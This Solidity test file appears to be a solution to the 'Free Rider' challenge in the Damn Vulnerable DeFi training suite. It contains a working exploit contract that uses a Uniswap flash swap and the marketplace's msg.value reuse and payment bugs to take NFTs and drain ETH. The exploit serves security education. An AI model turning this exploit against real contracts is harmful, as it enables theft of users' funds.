// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recoveryManagerOwner = makeAddr("recoveryManagerOwner");

    // The NFT marketplace has 6 tokens, at 15 ETH each
    uint256 constant NFT_PRICE = 15 ether;
    uint256 constant AMOUNT_OF_NFTS = 6;
    uint256 constant MARKETPLACE_INITIAL_ETH_BALANCE = 90 ether;

    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant BOUNTY = 45 ether;

    // Initial reserves for the Uniswap V2 pool
    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 15000e18;
    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 9000e18;

    WETH weth;
    DamnValuableToken token;
    IUniswapV2Factory uniswapV2Factory;
    IUniswapV2Router02 uniswapV2Router;
    IUniswapV2Pair uniswapPair;
    FreeRiderNFTMarketplace marketplace;
    DamnValuableNFT nft;
    FreeRiderRecoveryManager recoveryManager;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Player starts with limited ETH balance
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy tokens to be traded
        token = new DamnValuableToken();
        weth = new WETH();

        // Deploy Uniswap V2 Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "builds/uniswap/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );
        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "builds/uniswap/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        token.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(token), // token to be traded against WETH
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            block.timestamp * 2 // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapPair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(token), address(weth))
        );

        // Deploy the marketplace and get the associated ERC721 token
        // The marketplace will automatically mint AMOUNT_OF_NFTS to the deployer (see `FreeRiderNFTMarketplace::constructor`)
        marketplace = new FreeRiderNFTMarketplace{
            value: MARKETPLACE_INITIAL_ETH_BALANCE
        }(AMOUNT_OF_NFTS);

        // Get a reference to the deployed NFT contract. Then approve the marketplace to trade them.
        nft = marketplace.token();
        nft.setApprovalForAll(address(marketplace), true);

        // Open offers in the marketplace
        uint256[] memory ids = new uint256[](AMOUNT_OF_NFTS);
        uint256[] memory prices = new uint256[](AMOUNT_OF_NFTS);
        for (uint256 i = 0; i < AMOUNT_OF_NFTS; i++) {
            ids[i] = i;
            prices[i] = NFT_PRICE;
        }
        marketplace.offerMany(ids, prices);

        // Deploy recovery manager contract, adding the player as the beneficiary
        recoveryManager = new FreeRiderRecoveryManager{value: BOUNTY}(
            player,
            address(nft),
            recoveryManagerOwner,
            BOUNTY
        );

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(uniswapPair.token0(), address(weth));
        assertEq(uniswapPair.token1(), address(token));
        assertGt(uniswapPair.balanceOf(deployer), 0);
        assertEq(nft.owner(), address(0));
        assertEq(nft.rolesOf(address(marketplace)), nft.MINTER_ROLE());
        // Ensure deployer owns all minted NFTs.
        for (uint256 id = 0; id < AMOUNT_OF_NFTS; id++) {
            assertEq(nft.ownerOf(id), deployer);
        }
        assertEq(marketplace.offersCount(), 6);
        assertTrue(
            nft.isApprovedForAll(address(recoveryManager), recoveryManagerOwner)
        );
        assertEq(address(recoveryManager).balance, BOUNTY);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    // attack flow
    // 1. flash loan a bunch of weth and covert these weth to eth
    // 2. buy all nft in the marketplace
    // 3. duplicatly offer a nft to marketplace
    // 4. buy these duplicate nft and get the fund from marketplace
    // 5. transfer all nft to recovery manager and get the bounty
    // 6. repay the flash loan

    function test_freeRider() public checkSolvedByPlayer {
        MaliciousContract maliciousContract = new MaliciousContract(
            address(weth),
            address(token),
            address(marketplace),
            address(nft),
            address(recoveryManager),
            address(uniswapPair)
        );
        maliciousContract.attack();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private {
        // The recovery owner extracts all NFTs from its associated contract
        for (uint256 tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
            vm.prank(recoveryManagerOwner);
            nft.transferFrom(
                address(recoveryManager),
                recoveryManagerOwner,
                tokenId
            );
            assertEq(nft.ownerOf(tokenId), recoveryManagerOwner);
        }

        // Exchange must have lost NFTs and ETH
        assertEq(marketplace.offersCount(), 0);
        assertLt(address(marketplace).balance, MARKETPLACE_INITIAL_ETH_BALANCE);

        // Player must have earned all ETH
        assertGt(player.balance, BOUNTY);
        assertEq(address(recoveryManager).balance, 0);
    }
}

contract MaliciousContract {
    WETH public immutable weth;
    DamnValuableToken public immutable token;
    FreeRiderNFTMarketplace public immutable marketplace;
    DamnValuableNFT public immutable nft;
    FreeRiderRecoveryManager public immutable recoveryManager;
    IUniswapV2Pair public immutable uniswapPair;
    address public immutable player;

    constructor(
        address _weth,
        address _token,
        address _marketplace,
        address _nft,
        address _recoveryManager,
        address _uniswapPair
    ) {
        weth = WETH(payable(_weth));
        token = DamnValuableToken(_token);
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace));
        nft = DamnValuableNFT(_nft);
        recoveryManager = FreeRiderRecoveryManager(_recoveryManager);
        uniswapPair = IUniswapV2Pair(_uniswapPair);
        player = msg.sender;
    }

    function attack() external {
        if (uniswapPair.token0() == address(weth)) {
            uniswapPair.swap(20 ether, 0, address(this), "1");
        } else {
            uniswapPair.swap(0, 20 ether, address(this), "1");
        }
    }

    function uniswapV2Call(
        address sender,
        uint amount0,
        uint amount1,
        bytes calldata data
    ) external
    {
        weth.withdraw(20 ether);
        

        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            ids[i] = i;
        }
        // get 6 nfts and 75 ether
        marketplace.buyMany{value: 15 ether}(ids);
        console.log(address(this).balance);
        console.log(address(marketplace).balance);
        
        uint256[] memory offerIds = new uint256[](2);
        uint256[] memory prices = new uint256[](2);
        offerIds[0] = 0;
        offerIds[1] = 1;
        prices[0] = 15 ether;
        prices[1] = 15 ether;
        nft.approve(address(marketplace), 0);
        nft.approve(address(marketplace), 1);
        // duplicatly offer a nft to marketplace
        marketplace.offerMany(offerIds, prices);
        // buy these duplicate nfts and get the fund from marketplace
        marketplace.buyMany{value: 15 ether}(offerIds);
        console.log(address(this).balance);

        // transfer all nft to recovery manager and get the bounty
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recoveryManager), i, abi.encode(this));
        }
        // repay the flash loan
        uint256 fee = (uint256(20 ether) * 3) / 997 + 1;
        weth.deposit{value: 20 ether + fee}();
        weth.transfer(address(uniswapPair), 20 ether + fee);
        payable(player).transfer(address(this).balance);
        
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory _data) external returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() payable external {}
}
